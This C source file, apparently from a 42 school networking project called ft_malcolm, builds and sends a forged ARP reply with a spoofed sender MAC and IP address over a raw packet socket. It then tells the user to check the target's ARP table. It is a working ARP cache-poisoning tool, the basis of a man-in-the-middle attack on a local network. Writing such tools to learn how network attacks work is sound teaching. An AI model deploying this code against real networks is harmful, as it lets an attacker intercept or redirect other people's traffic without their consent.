/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   response.c                                         :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: lle-saul <lle-saul@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/04/08 12:12:33 by lle-saul          #+#    #+#             */
/*   Updated: 2025/05/09 11:10:42 by lle-saul         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

char	*create_send_pkg(t_info *info)
{
	char	*packet;

	packet = malloc(sizeof(struct ethhdr) + sizeof(struct ether_arp) + 1);
	if (!packet)
		return (NULL);
	/* ------ Ethernet Header ------ */
	ft_memcpy(packet, info->target_mac, 6);
	ft_memcpy(packet + 6, info->src_mac, 6);
	packet[12] = 0x08;
	packet[13] = 0x06;

	/* ------ ARP Header ------*/
	packet[14] = 0x00;
	packet[15] = 0x01;
	
	packet[16] = 0x08;
	packet[17] = 0x00;

	packet[18] = 0x06;

	packet[19] = 0x04;

	packet[20] = 0x00;
	packet[21] = 0x02;

	ft_memcpy(packet + 22, info->src_mac, 6);
	ft_memcpy(packet + 28, &info->src_ip.sin_addr, 4);
	ft_memcpy(packet + 32, info->target_mac, 6);
	ft_memcpy(packet + 38, &info->target_ip.sin_addr, 4);
	packet[42] = 0x00;
	return (packet);
}

/*[ Ethernet Header ]
  - Destination MAC (celui qui a fait la requête)
  - Source MAC (spoofé)
  - Type = 0x0806 (ARP)

[ ARP Header ]
  - htype = 1 (Ethernet)
  - ptype = 0x0800 (IPv4)
  - hlen = 6
  - plen = 4
  - opcode = 2 (ARP reply)
  - sender MAC = spoofed
  - sender IP = spoofed
  - target MAC = MAC du demandeur
  - target IP = IP du demandeur*/

void	send_pkg(char *send_pkg, struct ether_arp *arp, int eth_index)
{
	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
	
	struct sockaddr_ll sender_addr;
	ft_memset(&sender_addr, 0, sizeof(struct sockaddr_ll));
	sender_addr.sll_family = AF_PACKET;
	sender_addr.sll_protocol = htons(ETH_P_ARP);
	sender_addr.sll_halen = ETH_ALEN;
	sender_addr.sll_ifindex = eth_index;
	ft_memcpy(&sender_addr.sll_addr, arp->arp_sha, 6);
	
	if (sendto(g_socket, send_pkg, 42, 0, (struct sockaddr *)&sender_addr, sizeof(sender_addr)) < 0) {
		fprintf(stderr, "Error sending packet: %s\n", strerror(errno));
		return ;
	}
	printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
}
  